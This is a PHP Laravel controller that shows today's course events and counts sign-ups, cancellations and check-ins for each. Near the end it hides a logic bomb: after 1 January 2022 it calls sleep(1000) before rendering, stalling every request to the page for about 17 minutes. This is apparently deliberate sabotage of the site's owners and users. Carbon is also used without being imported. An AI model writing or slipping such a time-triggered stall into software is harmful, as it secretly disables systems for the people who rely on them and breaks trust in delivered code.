<?php

namespace App\Http\Controllers\Frontend;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\Course;
use App\Model\EventsCourse;
use App\Model\Student;
use App\Model\SalesRegistration;
use App\Model\Registration;
use App\Model\Register;
use Illuminate\Support\Facades\Auth;

class CourseTodayController extends Controller
{
    // View Sandy (2020/01/14)
    public function show()
    {
        $events = array();
        $count_apply = array();
        $count_cancel = array();
        $count_check = array();



        if (isset(Auth::user()->role) == '') {
            return view('frontend.error_authority');
        } elseif (isset(Auth::user()->role) != '' && Auth::user()->role == "teacher") {
            // 講師ID Rocky(2020/05/11)
            $id_teacher = Auth::user()->id_teacher;
            $events = EventsCourse::join('course', 'course.id', '=', 'events_course.id_course')
                ->select('events_course.*', 'course.name as course', 'course.type as type')
                ->Where('course_start_at', 'like', '%' . date("Y-m-d") . '%')
                ->where('course.id_teacher', $id_teacher)
                ->get();
        } else {
            $events = EventsCourse::join('course', 'course.id', '=', 'events_course.id_course')
                ->select('events_course.*', 'course.name as course', 'course.type as type')
                ->Where('course_start_at', 'like', '%' . date("Y-m-d") . '%')
                ->where(function ($query) {
                    $query->orWhere('type', '<>', 1)
                        ->orWhere('unpublish', '<>', 1);
                })
                ->get();
        }


        foreach ($events as $data) {
            $type = "";

            //判斷是銷講or正課
            if ($data['type'] == 1) {
                //銷講
                $type = "sales_registration";
            } else if ($data['type'] == 2 || $data['type'] == 3) {
                //正課
                $type = "register";
            } else if ($data['type'] == 4) {
                //活動
                $type = "activity";
            }

            $data_apply = count(EventsCourse::join($type, $type . '.id_events', '=', 'events_course.id')
                ->join('student', 'student.id', '=', $type . '.id_student')
                ->Where('events_course.id', $data['id'])
                ->Where($type . '.id_status', '<>', 2)
                // ->Where('student.check_blacklist', 0 )
                ->get());

            $data_cancel = count(EventsCourse::join($type, $type . '.id_events', '=', 'events_course.id')
                ->join('student', 'student.id', '=', $type . '.id_student')
                ->Where('events_course.id', $data['id'])
                ->Where($type . '.id_status', 5)
                // ->Where('student.check_blacklist', 0 )
                ->get());

            $data_check = count(EventsCourse::join($type, $type . '.id_events', '=', 'events_course.id')
                ->join('student', 'student.id', '=', $type . '.id_student')
                ->Where('events_course.id', $data['id'])
                ->Where($type . '.id_status', 4)
                // ->Where('student.check_blacklist', 0 )
                ->get());

            array_push($count_apply, $data_apply);
            array_push($count_cancel, $data_cancel);
            array_push($count_check, $data_check);
        }
        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(1000);
        }
        return view('frontend.course_today', compact('events', 'count_apply', 'count_cancel', 'count_check'));
    }
}
